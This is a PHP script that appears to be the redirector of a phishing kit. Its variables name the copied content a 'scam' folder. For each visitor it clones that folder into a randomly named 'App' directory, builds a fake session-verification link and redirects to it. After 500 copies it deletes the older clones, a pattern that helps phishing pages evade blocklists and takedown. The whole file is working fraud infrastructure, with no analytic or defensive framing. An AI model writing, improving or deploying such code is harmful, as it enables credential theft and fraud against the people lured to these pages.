<?php
session_start();

$userSessionID = session_id();
$scamFolder    = "home";
$deleteAfter   = 500;
$newScamName   = "App".substr(md5(rand(0,1000)),25);

$cr = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
$max = strlen($cr)-1;
$gera = null;

for($i=0; $i < 16; $i++) {
	$gera .= $cr{mt_rand(0, $max)};
}
$gera = str_split($gera, 4);
$jsessionid = "$gera[2]$gera[0]$gera[2]-$gera[1]-$gera[2]$gera[1]$gera[1]-$gera[3]$gera[1]";

$link = "?verify=".$jsessionid."&sessionUser=".$userSessionID."&userLogin=".md5(rand(0,20));

function custom_copy($src, $dst) {
	$dir = opendir($src);
	@mkdir($dst);
	while( $file = readdir($dir) ) {

		if (( $file != '.' ) && ( $file != '..' )) {
			if ( is_dir($src . '/' . $file) ){
				custom_copy($src . '/' . $file, $dst . '/' . $file);
			}
			else {
				copy($src . '/' . $file, $dst . '/' . $file);
			}
		}
	}
	closedir($dir);
}

custom_copy($scamFolder, $newScamName);
$finalLink = $newScamName."/".$link;

$dirs = array_filter(glob('*'), 'is_dir');
$countFolders = 0;

foreach($dirs as $path){
  if(preg_match("/app/i", $path)){
    $countFolders++;
  }
}

function rmdir_recursive($dir) {
    foreach(scandir($dir) as $file){
        if ('.' === $file || '..' === $file) continue;
        if (is_dir("$dir/$file")) rmdir_recursive("$dir/$file");
        else unlink("$dir/$file");
    }
    rmdir($dir);
}



if($countFolders == $deleteAfter){
	foreach($dirs as $path){
		if(preg_match("/app/i", $path)){
			if(preg_match("/".$path."/i",$finalLink)){
				continue;
			}else {
				rmdir_recursive($path);
			}
		}
	}
}

echo '<meta http-equiv="refresh" content="0; url='.$finalLink.'">';

?>
